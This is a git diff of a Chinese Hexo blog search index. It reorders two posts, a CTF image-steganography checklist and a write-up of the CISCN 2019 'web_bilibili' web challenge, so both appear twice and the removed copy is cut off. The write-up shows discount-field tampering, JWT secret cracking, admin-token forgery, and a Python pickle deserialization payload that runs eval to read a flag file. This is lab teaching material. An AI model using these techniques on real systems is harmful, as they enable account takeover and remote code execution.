@@ -1,6 +1,127 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTF中的图片隐写</title>
+    <url>/2020/09/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
+    <content><![CDATA[<ol>
+<li><p>所有图片通用方法</p>
+<ul>
+<li><p>Stegosolve查看是否颜色通道隐写</p>
+</li>
+<li><p>UE查看内嵌字符串</p>
+</li>
+<li><p>Exiftool查看Exif信息</p>
+</li>
+<li><p>strings命令查看字符串，已知flag格式时可尝试搜索flag格式</p>
+</li>
+<li><p>binwalk查看是否有包含其他文件</p>
+</li>
+</ul>
+</li>
+</ol>
+<a id="more"></a>
+
+<ul>
+<li><p>foremost分离包含文件</p>
+</li>
+<li><p>确定有包含其他文件，但foremost分离时卡死，使用dd命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dd</span> <span class="keyword">if</span>=&lt;输入文件名&gt; of=&lt;输出文件名&gt; skip=&lt;输出文件文件块起始地址&gt; bs=1</span><br></pre></td></tr></table></figure></li>
+<li><p>遇到两张几乎一样的图片，考虑叠加或找不同。叠加使用phototshop，找不同使用image_comperer.py</p>
+</li>
+</ul>
+<ol start="2">
+<li><p>png文件</p>
+<ul>
+<li>pngcheck</li>
+<li>修改文件头以改变图片高度、宽度</li>
+<li>zsteg</li>
+</ul>
+</li>
+<li><p>gif文件</p>
+<ul>
+<li>Namo Gif Animator分离帧</li>
+</ul>
+</li>
+<li><p>bmp</p>
+<ul>
+<li><a href=https://github.com/zed-oxff/zsteg>zsteg</a> 需要ruby环境</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usage:</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; <span class="string">&#x27;查看LSB信息</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -b 1 -o xy -v &#x27;</span>检测zlib</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; -v  <span class="string">&#x27;显示细节</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -a  &#x27;</span>尝试所有的组合</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>做题套路</category>
+      </categories>
+      <tags>
+        <tag>隐写</tag>
+        <tag>图片</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CISCN 2019 web_bilibili</title>
+    <url>/2020/09/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_5421_Web_bilibili/</url>
+    <content><![CDATA[<h1 id="CISCN-2019-web-bilibili"><a href="#CISCN-2019-web-bilibili" class="headerlink" title="CISCN 2019 web_bilibili"></a>CISCN 2019 web_bilibili</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3</a></p>
+<h2 id="题目提示"><a href="#题目提示" class="headerlink" title="题目提示"></a>题目提示</h2><p>薅羊毛与逻辑漏洞</p>
+<a id="more"></a>
+
+<h2 id="网站截图"><a href="#网站截图" class="headerlink" title="网站截图"></a>网站截图</h2><p><img src="https://i.loli.net/2020/09/29/hH8jkoWqmZvMy1f.jpg" alt="1.jpg"></p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
+<li><p>先注册试试看。注册成功后尝试购买了一个账号，成功。</p>
+<p><img src="https://i.loli.net/2020/09/29/8bAeomj5KkdDnW1.png" alt="image-20200807180927483.png"></p>
+</li>
+<li><p>浏览一下网页，发现了这样一句话：一定要买到lv6。突然想到之前ik*n买lv6账号爆睿站的事情。大概翻了几页，没看到lv6。检查元素后发现，每个等级对应的图片名称就是<code>lv</code>+等级+<code>.png</code></p>
+<p><img src="https://i.loli.net/2020/09/29/CUIRvkdMwr52GZs.png" alt="image-20200807181222993.png"></p>
+</li>
+<li><p>python脚本伺候.找到第181页有lv6账号</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">r&#x27;http://220.249.52.133:47045/shop?page=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    req = requests.get(url + str(page))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(<span class="string">&#x27;[+]FOUND!\n[+]At page&#x27;</span>,page)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到一个叫b*sh*的账号.价格真够贵.居然要1145141919,这么臭的价格,真的有买的必要吗?买一下试试,果然操作失败.</p>
+<p><img src="https://i.loli.net/2020/09/29/WhcD5Iy8jq9HdSp.png" alt="image-20200807182130307.png"></p>
+</li>
+<li><p>发现有一个叫折扣的东西,看一下源代码.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;jumbotron&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;shopcar_list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list-group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-group-item&quot;</span>&gt;</span>b*sh* <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span> /</span><br><span class="line">1145141919.0</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>优惠券:-20.0%<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>916113535.2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|632dee6f|b462f5648dfa4b927eeb9581ad057b17|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1624&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1145141919.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;discount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0.8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>结算<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到其中13-15行居然都是input标签,尝试修改.修改价格失败,修改折扣成功.点击结算后显示页面仅允许admin访问.</p>
+<p><img src="https://i.loli.net/2020/09/29/p1YEPOjqwRyZmG7.png" alt="image-20200807182852209.png"></p>
+</li>
+<li><p>已经登陆账号,再有身份验证就应该和cookies有关了.查看cookies,有一个JWT.</p>
+<p><img src="https://i.loli.net/2020/09/29/PVco83aCzr7suQS.png" alt="image-20200807183041972.png"></p>
+</li>
+</ol>
+<blockquote>
+<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准&lt;a href=<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519r&gt;RFC">https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519r&gt;RFC</a> 7519</a>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
+</blockquote>
+<p>​        搜索JWT后找到了相关工具<a href=https://github.com/brendan-rius/c-jwt-cracker>jwt cracker</a>,破解SHA256，得到密钥1Kun</p>
+<p>​            <img src="https://i.loli.net/2020/09/29/lyZhgSHod3tC7OM.png" alt="image-20200807185740445.png"></p>
+<p>​        在JWT.io生成新的JWT</p>
+<p><img src="https://i.loli.net/2020/09/29/WLFDPoYiymVx8fG.png" alt="image-20200807191017303.png"></p>
+<p>​        修改cookies后刷新。</p>
+<p><img src="https://i.loli.net/2020/09/29/jVE9oqwDz5fNdQG.png" alt="image-20200807191006876.png"></p>
+<p>​        进入到新的界面，然而按钮点击无效。查看源码。</p>
+<p><img src="https://i.loli.net/2020/09/29/yKaz46ChpvxgfQR.png" alt="image-20200807191126831.png"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span>This is Black Technology!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/b1g_m4mber&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|7d6064a8|aa2f7fa393b7c15560a61f46b348f1d0|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;f-m ui segment&quot;</span> <span class="attr">name</span>=<span class="string">&quot;become&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui secondary button &quot;</span>&gt;</span>一键成为大会员<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​        绝了，这题做着做着，还有剧情了。<br>​        在网页上检查元素，删掉第14行中的hidden=”hidden”，显示出输入栏<br>​        第3行中有一个压缩文件，下载解压后得到了网站的源码。其中有admin.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>​        到这里我不会了，打开admin.py，把里面不认识的函数+漏洞作为关键词挨个搜索了之后，urllib.load()这个函数存在一个反序列化漏洞。按照blog里的仿写一个payload。<a href=https://www.cnblogs.com/cimuhuashuimu/p/11544463.html>反序列化漏洞</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只能使用python2，python3因为不明原因无法正常生成payload</span></span><br><span class="line"><span class="keyword">import</span> pickle <span class="keyword">as</span> p</span><br><span class="line"><span class="keyword">import</span> urllib <span class="keyword">as</span> u</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&#x27;open(&quot;/flag.txt&quot;,&quot;r&quot;).read()&#x27;</span>,))</span><br><span class="line">a = p.dumps(payload())</span><br><span class="line">a = u.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p>​        将输出的payload填进输入栏后即得到flag</p>
+<p><img src="https://i.loli.net/2020/09/29/d14Rh3wYqOgWezu.png" alt="image-20200807193720295.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PNG文件结构</title>
     <url>/2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
     <content><![CDATA[<p>根据PNG文件的定义来说，其文件头位置总是由位固定的字节来描述的：</p>
@@ -388,127 +509,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF中的图片隐写</title>
-    <url>/2020/09/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
-    <content><![CDATA[<ol>
-<li><p>所有图片通用方法</p>
-<ul>
-<li><p>Stegosolve查看是否颜色通道隐写</p>
-</li>
-<li><p>UE查看内嵌字符串</p>
-</li>
-<li><p>Exiftool查看Exif信息</p>
-</li>
-<li><p>strings命令查看字符串，已知flag格式时可尝试搜索flag格式</p>
-</li>
-<li><p>binwalk查看是否有包含其他文件</p>
-</li>
-</ul>
-</li>
-</ol>
-<a id="more"></a>
-
-<ul>
-<li><p>foremost分离包含文件</p>
-</li>
-<li><p>确定有包含其他文件，但foremost分离时卡死，使用dd命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dd</span> <span class="keyword">if</span>=&lt;输入文件名&gt; of=&lt;输出文件名&gt; skip=&lt;输出文件文件块起始地址&gt; bs=1</span><br></pre></td></tr></table></figure></li>
-<li><p>遇到两张几乎一样的图片，考虑叠加或找不同。叠加使用phototshop，找不同使用image_comperer.py</p>
-</li>
-</ul>
-<ol start="2">
-<li><p>png文件</p>
-<ul>
-<li>pngcheck</li>
-<li>修改文件头以改变图片高度、宽度</li>
-<li>zsteg</li>
-</ul>
-</li>
-<li><p>gif文件</p>
-<ul>
-<li>Namo Gif Animator分离帧</li>
-</ul>
-</li>
-<li><p>bmp</p>
-<ul>
-<li><a href=https://github.com/zed-oxff/zsteg>zsteg</a> 需要ruby环境</li>
-</ul>
-</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usage:</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; <span class="string">&#x27;查看LSB信息</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -b 1 -o xy -v &#x27;</span>检测zlib</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; -v  <span class="string">&#x27;显示细节</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -a  &#x27;</span>尝试所有的组合</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>做题套路</category>
-      </categories>
-      <tags>
-        <tag>隐写</tag>
-        <tag>图片</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CISCN 2019 web_bilibili</title>
-    <url>/2020/09/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_5421_Web_bilibili/</url>
-    <content><![CDATA[<h1 id="CISCN-2019-web-bilibili"><a href="#CISCN-2019-web-bilibili" class="headerlink" title="CISCN 2019 web_bilibili"></a>CISCN 2019 web_bilibili</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3</a></p>
-<h2 id="题目提示"><a href="#题目提示" class="headerlink" title="题目提示"></a>题目提示</h2><p>薅羊毛与逻辑漏洞</p>
-<a id="more"></a>
-
-<h2 id="网站截图"><a href="#网站截图" class="headerlink" title="网站截图"></a>网站截图</h2><p><img src="https://i.loli.net/2020/09/29/hH8jkoWqmZvMy1f.jpg" alt="1.jpg"></p>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
-<li><p>先注册试试看。注册成功后尝试购买了一个账号，成功。</p>
-<p><img src="https://i.loli.net/2020/09/29/8bAeomj5KkdDnW1.png" alt="image-20200807180927483.png"></p>
-</li>
-<li><p>浏览一下网页，发现了这样一句话：一定要买到lv6。突然想到之前ik*n买lv6账号爆睿站的事情。大概翻了几页，没看到lv6。检查元素后发现，每个等级对应的图片名称就是<code>lv</code>+等级+<code>.png</code></p>
-<p><img src="https://i.loli.net/2020/09/29/CUIRvkdMwr52GZs.png" alt="image-20200807181222993.png"></p>
-</li>
-<li><p>python脚本伺候.找到第181页有lv6账号</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">r&#x27;http://220.249.52.133:47045/shop?page=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    req = requests.get(url + str(page))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(<span class="string">&#x27;[+]FOUND!\n[+]At page&#x27;</span>,page)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到一个叫b*sh*的账号.价格真够贵.居然要1145141919,这么臭的价格,真的有买的必要吗?买一下试试,果然操作失败.</p>
-<p><img src="https://i.loli.net/2020/09/29/WhcD5Iy8jq9HdSp.png" alt="image-20200807182130307.png"></p>
-</li>
-<li><p>发现有一个叫折扣的东西,看一下源代码.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;jumbotron&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;shopcar_list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list-group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-group-item&quot;</span>&gt;</span>b*sh* <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span> /</span><br><span class="line">1145141919.0</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>优惠券:-20.0%<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>916113535.2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|632dee6f|b462f5648dfa4b927eeb9581ad057b17|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1624&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1145141919.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;discount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0.8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>结算<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意到其中13-15行居然都是input标签,尝试修改.修改价格失败,修改折扣成功.点击结算后显示页面仅允许admin访问.</p>
-<p><img src="https://i.loli.net/2020/09/29/p1YEPOjqwRyZmG7.png" alt="image-20200807182852209.png"></p>
-</li>
-<li><p>已经登陆账号,再有身份验证就应该和cookies有关了.查看cookies,有一个JWT.</p>
-<p><img src="https://i.loli.net/2020/09/29/PVco83aCzr7suQS.png" alt="image-20200807183041972.png"></p>
-</li>
-</ol>
-<blockquote>
-<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准&lt;a href=<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519r&gt;RFC">https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519r&gt;RFC</a> 7519</a>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
-</blockquote>
-<p>​        搜索JWT后找到了相关工具<a href=https://github.com/brendan-rius/c-jwt-cracker>jwt cracker</a>,破解SHA256，得到密钥1Kun</p>
-<p>​            <img src="https://i.loli.net/2020/09/29/lyZhgSHod3tC7OM.png" alt="image-20200807185740445.png"></p>
-<p>​        在JWT.io生成新的JWT</p>
-<p><img src="https://i.loli.net/2020/09/29/WLFDPoYiymVx8fG.png" alt="image-20200807191017303.png"></p>
-<p>​        修改cookies后刷新。</p>
-<p><img src="https://i.loli.net/2020/09/29/jVE9oqwDz5fNdQG.png" alt="image-20200807191006876.png"></p>
-<p>​        进入到新的界面，然而按钮点击无效。查看源码。</p>
-<p><img src="https://i.loli.net/2020/09/29/yKaz46ChpvxgfQR.png" alt="image-20200807191126831.png"></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span>This is Black Technology!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span 